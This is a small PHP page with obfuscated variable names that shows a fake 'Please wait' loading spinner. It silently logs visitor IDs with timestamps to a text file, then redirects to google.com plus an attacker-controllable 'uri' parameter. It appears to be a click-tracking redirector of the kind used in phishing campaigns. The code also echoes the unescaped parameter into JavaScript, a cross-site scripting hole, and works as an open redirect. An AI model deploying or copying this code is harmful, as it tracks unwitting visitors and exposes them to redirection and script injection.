<?php
$sp4b670b = 'http://google.com'; if (!empty($_REQUEST['uri'])) { $sp4b670b .= $_REQUEST['uri']; } $sp3073b9 = preg_replace('/[^0-9A-Za-z]/', '', $_REQUEST['id']); if (!empty($sp3073b9)) { if (file_exists('s.txt')) { $sp5d3a26 = @unserialize(@file_get_contents('s.txt')) ?: array(); } else { $sp5d3a26 = array(); } if (empty($sp5d3a26[$sp3073b9])) { $sp5d3a26[$sp3073b9] = array(); } if (empty($sp5d3a26[$sp3073b9]['visited'])) { $sp5d3a26[$sp3073b9]['visited'] = time(); } @file_put_contents('s.txt', serialize($sp5d3a26)); } ?>
<html>
<head>
<title>Please wait...</title>

<script language="javascript">

window.setTimeout(function() {
	window.location = "<?php  echo $sp4b670b; ?>
";
}, 1000);

</script>

<style type="text/css">

	*
	{
		font-family: Arial, Tahoma, sans-serif;
		font-size: 16px;
		text-align: center;
	}

	@keyframes ui-loading-bars
	{
		0%
		{
			top: 6px;
			height: 51px;
		}
		50%, 100%
		{
			top: 19px;
			height: 26px;
		}
	}


	.ui-loading-bars
	{
		position: absolute;
		width: 64px;
		height: 64px;
		left: 50%;
		top: 50%;
		margin-top: -65px;
		margin-left: -32px;
		z-index: 100;
	}


	.ui-loading-bars div
	{
		display: inline-block;
		position: absolute;
		left: 6px;
		width: 13px;
		animation: ui-loading-bars 1.2s cubic-bezier(0, 0.5, 0.5, 1) infinite;
		background-color: #666666;
		border-radius: 5px;
	}



	.ui-loading-bars div:nth-child(1)
	{
		left: 6px;
		animation-delay: -0.24s;
	}

	.ui-loading-bars div:nth-child(2)
	{
		left: 26px;
		animation-delay: -0.12s;
	}

	.ui-loading-bars div:nth-child(3)
	{
		left: 45px;
		animation-delay: 0s;
	}

	.loading
	{
		position: fixed;
		top: 50%;
		width: 100%;
	}


	.loading p
	{
		margin: 15px 0 0 0;
	}

</style>

</head>
<body>

<div class="loading">

	<div class="ui-loading-bars">
		<div></div>
		<div></div>
		<div></div>
	</div>
	<p>Please wait. Page is loading now...</p>
</div>

</body>
</html>
<?php 